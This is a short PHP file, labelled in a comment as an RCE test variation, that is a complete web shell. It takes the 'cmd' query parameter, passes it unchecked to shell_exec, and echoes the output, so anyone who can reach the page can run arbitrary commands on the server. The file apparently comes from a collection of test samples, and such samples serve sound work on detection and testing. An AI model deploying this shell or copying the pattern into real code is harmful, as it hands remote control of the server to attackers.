<?php
// RCE test variation #145
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>